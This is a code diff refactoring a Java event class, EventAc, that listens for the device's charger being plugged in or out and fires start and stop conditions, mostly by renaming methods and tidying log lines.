@@ -13,6 +13,7 @@ import java.io.IOException;
 
 import com.android.service.Ac;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerAc;
 import com.android.service.util.Check;
@@ -26,43 +27,38 @@ public class EventAc extends BaseEvent implements Observer<Ac> {
 	private boolean inRange = false;
 
 	@Override
-	public void begin() {
+	public void actualEnable() {
 		ListenerAc.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualDisable() {
 		ListenerAc.self().detach(this);
 	}
 
 	@Override
-	protected boolean parse(EventConf conf) {
-				
-		return true;
-	}
+	protected boolean parse(ConfEvent conf) {
 
-	@Override
-	public void go() {
-		// TODO Auto-generated method stub
+		return true;
 	}
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(Ac a) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Got power status notification: " + a.getStatus()) ;//$NON-NLS-1$
+			Check.log(TAG + " Got power status notification: " + a.getStatus());//$NON-NLS-1$
 		}
 
 		// Nel range
 		if (a.getStatus() == true && inRange == false) {
 			inRange = true;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " AC IN") ;//$NON-NLS-1$
+				Check.log(TAG + " AC IN");//$NON-NLS-1$
 			}
 			onEnter();
 		} else if (a.getStatus() == false && inRange == true) {
 			inRange = false;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " AC OUT") ;//$NON-NLS-1$
+				Check.log(TAG + " AC OUT");//$NON-NLS-1$
 			}
 			onExit();
 		}
@@ -71,10 +67,10 @@ public class EventAc extends BaseEvent implements Observer<Ac> {
 	}
 
 	public void onEnter() {
-		triggerStartAction();
+		startCondition();
 	}
 
 	public void onExit() {
-		triggerStopAction();
+		stopCondition();
 	}
 }
